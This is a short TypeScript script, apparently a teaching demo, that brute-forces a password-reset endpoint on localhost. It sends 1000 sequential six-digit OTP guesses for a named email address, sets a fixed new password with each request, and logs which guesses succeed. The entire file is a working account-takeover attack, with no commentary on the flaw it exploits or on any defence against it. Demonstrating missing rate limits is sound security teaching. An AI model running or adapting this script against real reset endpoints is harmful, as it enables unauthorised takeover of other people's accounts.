import axios from "axios";

// Function to send a single request
async function sendRequest(otp: string) {
  const data = JSON.stringify({
    email: "harkirat@gmail.com",
    otp: otp,
    newPassword: "123123123",
  });

  const config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset_password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  try {
    const response = await axios.request(config);
    console.log(`OTP ${otp} → Success`, response.data);
  } catch (error: any) {
    console.error(`OTP ${otp} → Failed`, error.response?.data || error.message);
  }
}

// Generate and fire 1000 OTPs
async function spamOTPs() {
  for (let i = 0; i < 1000; i++) {
    const otp = (100000 + i).toString(); // generates 6-digit OTPs: 100000, 100001, ...
    await sendRequest(otp); // sequential — can change to parallel below
  }
}

spamOTPs();
